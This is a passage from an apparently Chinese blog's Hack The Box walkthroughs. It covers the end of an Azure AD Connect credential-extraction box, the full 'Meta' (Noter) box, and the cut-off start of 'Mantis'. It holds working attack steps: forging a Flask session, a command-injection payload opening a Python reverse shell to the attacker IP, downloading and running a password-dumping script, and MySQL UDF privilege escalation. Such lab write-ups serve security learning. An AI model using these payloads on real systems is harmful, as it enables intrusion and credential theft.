class="hljs-literal">----</span><br><span class="hljs-literal">-a----</span>        <span class="hljs-number">8</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">4</span>:<span class="hljs-number">54</span> PM         <span class="hljs-number">136248</span> Microsoft.Online.PasswordSynchronization.dll<br><br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Program Files\Microsoft Azure AD Sync\Bin&gt; <br></code></pre></td></tr></table></figure><p><code>C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll</code>负责密钥管理和解密此数据的程序集的引用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin&gt; <span class="hljs-built_in">ls</span> *mcrypt.dll*<br><br><br>    Directory: C:\Program Files\Microsoft Azure AD Sync\Bin<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        8/31/2018   4:54 PM         335744 mcrypt.dll<br><br><br>*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin&gt; <br></code></pre></td></tr></table></figure><p>我直接引用了大佬的POC脚本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Program Files\Microsoft Azure AD Sync\Bin&gt; <span class="hljs-built_in">cd</span> /programdata<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; <span class="hljs-built_in">wget</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">16.11</span>/<span class="hljs-built_in">Get-AzureADPasswd</span>.ps1 <span class="hljs-literal">-O</span> <span class="hljs-built_in">Get-AzureADPasswd</span>.ps1<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; . .\<span class="hljs-built_in">Get-AzureADPasswd</span>.ps1<br>Domain: MEGABANK.LOCAL<br>Username: administrator<br>Password: d0m@in4dminyeah!<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; <br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.172</span> <span class="hljs-literal">-u</span> administrator <span class="hljs-literal">-p</span> d0m@in4dminyeah!  <br><br>Evil<span class="hljs-literal">-WinRM</span> shell v3.<span class="hljs-number">3</span><br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is</span> <span class="hljs-title">unimplemented</span> <span class="hljs-title">on</span> <span class="hljs-title">this</span> <span class="hljs-title">machine</span></span><br><br><span class="hljs-keyword">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil<span class="hljs-literal">-WinRM</span> Github: https://github.com/Hackplayers/evil<span class="hljs-literal">-winrm</span><span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\Administrator\Documents&gt; <span class="hljs-built_in">type</span> ../desktop/root.txt<br><span class="hljs-number">129</span>............................................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Meta</title>
    <link href="/post/HackTheBox-Meta.html"/>
    <url>/post/HackTheBox-Meta.html</url>
    
    <content type="html"><![CDATA[<p>HTB Walkthrough - Meta</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.160<br>Host is up (0.44s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE VERSION<br>21/tcp   open  ftp     vsftpd 3.0.3<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)<br>|_http-title: Noter<br>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1172.75 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ searchsploit vsftpd 3.0.3                              <br>------------------------------------------------------------- ---------------------------------<br> Exploit Title                                               |  Path<br>------------------------------------------------------------- ---------------------------------<br>vsftpd 3.0.3 - Remote Denial of Service                      | multiple/remote/49719.py<br>------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br>Papers: No Results<br></code></pre></td></tr></table></figure><p>远程拒绝服务。先看一下5000端口吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ whatweb http://noter.htb:5000/<br>http://noter.htb:5000/ [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.8.10], IP[10.10.11.160], Python[3.8.10], Script[text/javascript], Title[Noter], Werkzeug[2.0.2]<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607160908141.png" alt="image-20220607160908141"></p><p>能够注册一个账户，是一个记录笔记的应用，我一开始以为是SSTI，但是不是，提交了下payload没有用，后来我发现了cookie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibW9zYWljIn0.Yp8Ibw.jI532KgdGFcx7JtWLb6UaSOaeIM<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibW9zYWljIn0.Yp8Ibw.jI532KgdGFcx7JtWLb6UaSOaeIM&#x27;</span>|<span class="hljs-built_in">base64</span> -d<br>&#123;<span class="hljs-string">&quot;logged_in&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;mosaic&quot;</span>&#125;<span class="hljs-built_in">base64</span>: 输入无效<br><br></code></pre></td></tr></table></figure><p>是JWT。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ flask-unsign --unsign --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval --cookie <span class="hljs-string">&#x27;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibW9zYWljIn0.Yp8Ibw.jI532KgdGFcx7JtWLb6UaSOaeIM&#x27;</span><br>[*] Session decodes to: &#123;<span class="hljs-string">&#x27;logged_in&#x27;</span>: True, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;mosaic&#x27;</span>&#125;<br>[*] Starting brute-forcer with 8 threads..<br>[+] Found secret key after 17024 attempts<br>b<span class="hljs-string">&#x27;secret123&#x27;</span><br></code></pre></td></tr></table></figure><p>密钥是secret123。JWT令牌中只包含一个用户名，不需要密码，或许我应该尝试去枚举目标其他用户名 然后看别人写了什么笔记，获取能有一些信息。而目标应用用户名存在与不存在返回的错误信息是不一样的，可以被用来枚举用户名。而我枚举出了blue。然后制作其JWT令牌：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ flask-unsign --sign --cookie <span class="hljs-string">&quot;&#123;&#x27;logged_in&#x27;: True, &#x27;username&#x27;: &#x27;blue&#x27;&#125;&quot;</span> --secret <span class="hljs-string">&#x27;secret123&#x27;</span> <br>eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yp8M8A.Y9wfX6rr5dGyxaKz26-1g4hqAIo<br></code></pre></td></tr></table></figure><p>blue有两篇笔记，在其中一篇笔记中有FTP密码：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607163533323.png" alt="image-20220607163533323"></p><p>在FTP中有个PDF：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">229 Entering Extended Passive Mode (|||60839|)<br>150 Here comes the directory listing.<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">ls</span> -all<br>229 Entering Extended Passive Mode (|||6850|)<br>150 Here comes the directory listing.<br>drwxr-xr-x    2 1002     1002         4096 May 02 23:05 .<br>drwxr-xr-x    3 0        1002         4096 May 02 23:05 ..<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">cd</span> ..<br>250 Directory successfully changed.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||25683|)<br>150 Here comes the directory listing.<br>drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files<br>-rw-r--r--    1 1002     1002        12569 Dec 24 20:59 policy.pdf<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607163845728.png" alt="image-20220607163845728"></p><p>根据默认密码格式尝试ftp_admin：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ftp 10.10.11.160<br>Connected to 10.10.11.160.<br>220 (vsFTPd 3.0.3)<br>Name (10.10.11.160:mosaic): ftp_admin<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||28496|)<br>150 Here comes the directory listing.<br>-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip<br>-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip<br><br></code></pre></td></tr></table></figure><p>在里边文件中，有一行密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/python3</span><br>from flask import Flask, render_template, flash, redirect, url_for, abort, session, request, logging, send_file<br>from flask_mysqldb import MySQL<br>from wtforms import Form, StringField, TextAreaField, PasswordField, validators<br>from passlib.hash import sha256_crypt<br>from functools import wraps<br>import time<br>import requests as pyrequest<br>from html2text import html2text<br>import markdown<br>import random, os, subprocess<br><br>app = Flask(__name__)<br><br><span class="hljs-comment"># Config MySQL</span><br>app.config[<span class="hljs-string">&#x27;MYSQL_HOST&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span><br>app.config[<span class="hljs-string">&#x27;MYSQL_USER&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span><br>app.config[<span class="hljs-string">&#x27;MYSQL_PASSWORD&#x27;</span>] = <span class="hljs-string">&#x27;Nildogg36&#x27;</span><br>app.config[<span class="hljs-string">&#x27;MYSQL_DB&#x27;</span>] = <span class="hljs-string">&#x27;app&#x27;</span><br>app.config[<span class="hljs-string">&#x27;MYSQL_CURSORCLASS&#x27;</span>] = <span class="hljs-string">&#x27;DictCursor&#x27;</span><br></code></pre></td></tr></table></figure><p>在源码中还会有这么一段：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Export remote</span><br>@app.route(<span class="hljs-string">&#x27;/export_note_remote&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])<br>@is_logged_in<br>def export_note_remote():<br>    <span class="hljs-keyword">if</span> check_VIP(session[<span class="hljs-string">&#x27;username&#x27;</span>]):<br>        try:<br>            url = request.form[<span class="hljs-string">&#x27;url&#x27;</span>]<br><br>            status, error = parse_url(url)<br><br>            <span class="hljs-keyword">if</span> (status is True) and (error is None):<br>                try:<br>                    r = pyrequest.get(url,allow_redirects=True)<br>                    rand_int = random.randint(1,10000)<br>                    <span class="hljs-built_in">command</span> = f<span class="hljs-string">&quot;node misc/md-to-pdf.js  $&#x27;&#123;r.text.strip()&#125;&#x27; &#123;rand_int&#125;&quot;</span><br>                    subprocess.run(<span class="hljs-built_in">command</span>, shell=True, executable=<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br><br>                    <span class="hljs-keyword">if</span> os.path.isfile(attachment_dir + f<span class="hljs-string">&#x27;&#123;str(rand_int)&#125;.pdf&#x27;</span>):<br><br>                        <span class="hljs-built_in">return</span> send_file(attachment_dir + f<span class="hljs-string">&#x27;&#123;str(rand_int)&#125;.pdf&#x27;</span>, as_attachment=True)<br><br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">return</span> render_template(<span class="hljs-string">&#x27;export_note.html&#x27;</span>, error=<span class="hljs-string">&quot;Error occured while exporting the !&quot;</span>)<br><br>                except Exception as e:<br>                    <span class="hljs-built_in">return</span> render_template(<span class="hljs-string">&#x27;export_note.html&#x27;</span>, error=<span class="hljs-string">&quot;Error occured!&quot;</span>)<br><br><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">return</span> render_template(<span class="hljs-string">&#x27;export_note.html&#x27;</span>, error=f<span class="hljs-string">&quot;Error occured while exporting ! (&#123;error&#125;)&quot;</span>)<br>            <br>        except Exception as e:<br>            <span class="hljs-built_in">return</span> render_template(<span class="hljs-string">&#x27;export_note.html&#x27;</span>, error=f<span class="hljs-string">&quot;Error occured while exporting ! (&#123;e&#125;)&quot;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        abort(403)<br></code></pre></td></tr></table></figure><p>他会把md文件中的文本当初代码执行，还会md文件转换成PDF。然后我构造了如下数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/export_note_remote</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>noter.htb:5000<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://noter.htb:5000/add_note<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yp8M8A.Y9wfX6rr5dGyxaKz26-1g4hqAIo<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p>还是需要blue的JWT令牌，因为它是VIP。然后就能看到远程上传md文件的地方：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607165922840.png" alt="image-20220607165922840"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&#x27;;python3 -c &#x27;</span>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="hljs-number">10.10</span>.<span class="hljs-number">16.8</span>&quot;,<span class="hljs-number">1337</span>));<br>os.dup2( s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(<span class="hljs-string">&quot;sh&quot;</span>)<span class="hljs-string">&#x27; # &#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python3 -m http.server 80                                          <br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.11.160 - - [07/Jun/2022 17:03:19] <span class="hljs-string">&quot;GET /payload.md HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nc -lvnp  1337<br>listening on [any] 1337 ...<br>connect to [10.10.16.8] from (UNKNOWN) [10.10.11.160] 51580<br>$ <br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">svc@noter:~/app/web$ <span class="hljs-built_in">ls</span><br>app.py  misc  templates<br>svc@noter:~/app/web$ <span class="hljs-built_in">cd</span> /home/<br>svc@noter:/home$ <span class="hljs-built_in">ls</span><br>svc<br>svc@noter:/home$ <span class="hljs-built_in">cd</span> svc/<br>svc@noter:~$ <span class="hljs-built_in">ls</span><br>app  user.txt<br>svc@noter:~$ <span class="hljs-built_in">cat</span> user.txt <br>70.........................<br></code></pre></td></tr></table></figure><p>目标部署了mysql。可以用mysql提权:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">------------------------------------------------------------- ---------------------------------<br> Exploit Title                                               |  Path<br>------------------------------------------------------------- ---------------------------------<br>MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic  | linux/local/1518.c<br>MySQL 4.x/5.0 (Windows) - User-Defined Function Command Exec | windows/remote/3274.txt<br>------------------------------------------------------------- ---------------------------------<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc -g -c raptor_udf2.c<br>gcc -g -c raptor_udf2.c<br>$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc<br>gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc<br>$ mysql -u root -p<br>mysql -u root -p<br>Enter password: Nildogg36<br><br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection <span class="hljs-built_in">id</span> is 50<br>Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>MariaDB [(none)]&gt; use mysql;<br>use mysql;<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [mysql]&gt;  create table foo(line blob);<br> create table foo(line blob);<br>Query OK, 0 rows affected (0.008 sec)<br><br>MariaDB [mysql]&gt; insert into foo values(load_file(<span class="hljs-string">&#x27;/home/svc/raptor_udf2.so&#x27;</span>));<br>insert into foo values(load_file(<span class="hljs-string">&#x27;/home/svc/raptor_udf2.so&#x27;</span>));<br>Query OK, 1 row affected (0.002 sec)<br><br>MariaDB [mysql]&gt;  <span class="hljs-keyword">select</span> * from foo into dumpfile <span class="hljs-string">&#x27;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so&#x27;</span>;<br>iadb19/plugin/raptor_udf2.so<span class="hljs-string">&#x27;;le &#x27;</span>/usr/lib/x86_64-linux-gnu/mar <br>Query OK, 1 row affected (0.001 sec)<br><br>MariaDB [mysql]&gt; create <span class="hljs-keyword">function</span> do_system returns <span class="hljs-built_in">integer</span> soname <span class="hljs-string">&#x27;raptor_udf2.so&#x27;</span>;<br>o<span class="hljs-string">&#x27;;ate function do_system returns integer soname &#x27;</span>raptor_udf2.s <br>Query OK, 0 rows affected (0.001 sec)<br><br>MariaDB [mysql]&gt; <span class="hljs-keyword">select</span> * from mysql.func;<br><span class="hljs-keyword">select</span> * from mysql.func;<br>+-----------+-----+----------------+----------+<br>| name      | ret | dl             | <span class="hljs-built_in">type</span>     |<br>+-----------+-----+----------------+----------+<br>| do_system |   2 | raptor_udf2.so | <span class="hljs-keyword">function</span> |<br>+-----------+-----+----------------+----------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.000 sec)<br><br>MariaDB [mysql]&gt;  <span class="hljs-keyword">select</span> do_system(<span class="hljs-string">&#x27;cat /root/root.txt &gt; /tmp/flag.txt;chown svc:svc /tmp/flag.txt&#x27;</span>);<br>:svc /tmp/flag.txt<span class="hljs-string">&#x27;);t /root/root.txt &gt; /tmp/flag.txt;chown svc </span><br><span class="hljs-string">+-----------------------------------------------------------------------------+</span><br><span class="hljs-string">| do_system(&#x27;</span><span class="hljs-built_in">cat</span> /root/root.txt &gt; /tmp/flag.txt;<span class="hljs-built_in">chown</span> svc:svc /tmp/flag.txt<span class="hljs-string">&#x27;) |</span><br><span class="hljs-string">+-----------------------------------------------------------------------------+</span><br><span class="hljs-string">|                                                                           0 |</span><br><span class="hljs-string">+-----------------------------------------------------------------------------+</span><br><span class="hljs-string">1 row in set (0.004 sec)</span><br><span class="hljs-string">MariaDB [mysql]&gt;  \! sh</span><br><span class="hljs-string"></span><br><span class="hljs-string">$ cat /tmp/flag.txt</span><br><span class="hljs-string">cat /tmp/flag.txt</span><br><span class="hljs-string">f6...................................</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Mantis</title>
    <link href="/post/HackTheBox-Mantis.html"/>
    <url>/post/HackTheBox-Mantis.html</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 